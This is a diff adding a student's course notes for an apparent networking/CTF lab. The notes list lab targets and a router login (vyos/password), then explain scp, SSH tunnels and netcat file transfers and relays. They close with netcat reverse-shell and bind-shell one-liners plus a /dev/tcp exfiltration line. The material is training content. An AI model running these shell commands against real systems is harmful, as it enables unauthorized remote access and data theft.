@@ -582,12 +582,195 @@ curl localhost (send url request and grabs first thing) --see if its a web page
 telnet alternate ports:
 telnet <ip> <port>
 
+T1
+Hostname: networking-ctfd-2.server.vta
+Record Type: TXT
+IP: UNKNOWN
+Ports: 53
+Action: interrogate DNS records
+
+Red Boundry Router
+Hostname:
+IP: 172.16.120.1
+Ports: 22
+Username: vyos
+Password: password
+Action: Use as start point and Perform Passive/Active Reconnaissance
+
+T2
+Hostname: UNKNOWN
+IP: 172.16.182.110
+Action: Perform Active Reconnaissance
+
+T3
+Hostname: UNKNOWN
+IP: 172.16.140.33
+Action: Perform Active Reconnaissance
+ports: 2000,2011,2200,2250
+T4
+Hostname: UNKNOWN
+IP: 172.16.182.106
+Action: Perform Active Reconnaissance
+
+T5
+Hostname: UNKNOWN
+IP: 172.16.182.114
+Action: Perform Active Reconnaissance
+
+T6
+Hostname: UNKNOWN
+IP: 172.16.182.118
+Action: Perform Active Reconnaissance
+
+T7
+Hostname: UNKNOWN
+IP: 172.16.140.35
+Action: Perform Active Reconnaissance
 
 
 
+2000,2011,2200,2246,2247,2250,2254,2269,2277,2290,2619,2645,2660,2664,2675,2687,2689,2710,2712,2718,2720,2722,2748,2797,2801,2803,2804,2814,2852,2856,2879,
+
+##DATA TRANSFER MOVEMENT AND REDIRECTION
+
+Common tranfer methods: tftp(UDP), ftp(active and passive), dftp. scp
+
+TFTP:
+UDP transport
+Very Small and Simple
+Insecure
+
+FTP:
+RFC 959
+TCP transport
+multipe tcp connections
+authent through clear text
+insecure
+
+Active vs Passive:
+In active the computer reaches to you
+while in passive you end to comuter and allow stuff back
+**passive is good for passing through ACL's
+
+SFTP:
+Secure file transfer protocol
+TCP transport (TCP Port 22)
+symmetric and asymmetric encryption
+authent through sign in
+interactive terminal access
+
+FTPS:
+TCP transport(port 443)
+ssl/tls encryption
+authent user/pass
+interactive terminal access
+
+ssh to a computer with a different port:
+ssh user@host -p <port>
+
+Scp Syntax:
+Download a file from a remote directory to a local directory
+
+$ scp student@172.16.82.106:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+
+$ scp secretstuff.txt student@172.16.82.106:/home/student
+
+Copy a file from a remote host to a separate remote host
+
+$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+
+SCP Syntax w/ alternate SSHD
+Download a file from a remote directory to a local directory
+
+$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+
+$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+
+SCP Syntax through a tunnel
+
+ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+Download a file from a remote directory to a local directory
+
+$ scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+
+$ scp -P 1111 secretstuff.txt student@localhost:/home/student
+
+#TOOLS
+
+NETCAT:
+used for inbund outbound connections
+troubleshooting  sending teceiving data
+
+NETCAT: Client to listener file transfer
+
+Client (sends file): nc 10.2.0.2 9001 < file.txt
+Listener (receive file): nc -l -p 9001 > newfile.txt
+
+NETCAT: Listener to Client file transfer
+
+Listener (sends file): nc -l -p 9001 < file.txt
+Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+
+NETCAT Relay Demos
+
+On Client Relay:
+
+mknod mypipe p
+nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+
+examples:
+nc 172.16.82.115 6789 0< mypipe | nc 10.10.0.40 5556 1> mypipe
+nc -lp 6789 0< mypipe | nc 10.10.0.40 5556 1> mypipe
+
+On Listener2 (sends info):
+
+nc -l -p 9002 < infile.txt
+
+On Listener1 (receives info):
+
+nc -l -p 9001 > outfile.txt
+
+Writes the output to listener1 and listener2 through the named pipe
+
+Hosts without Netcat:
+
+File Transfer with /dev/tcp
+
+On the receiving box:
+
+nc -l -p 1111 > file.txt
+
+On the sending box:
+
+cat file.txt > /dev/tcp/10.2.0.2/1111
+
+This method is useful for host that does not have NETCAT available.
 
 
+Reverse shell using NETCAT
 
+When shelled into the remote host using -c :
+
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+
+/bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+
+nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+
+nc -l -p <any unfiltered port> -e /bin/bash
 
 
 
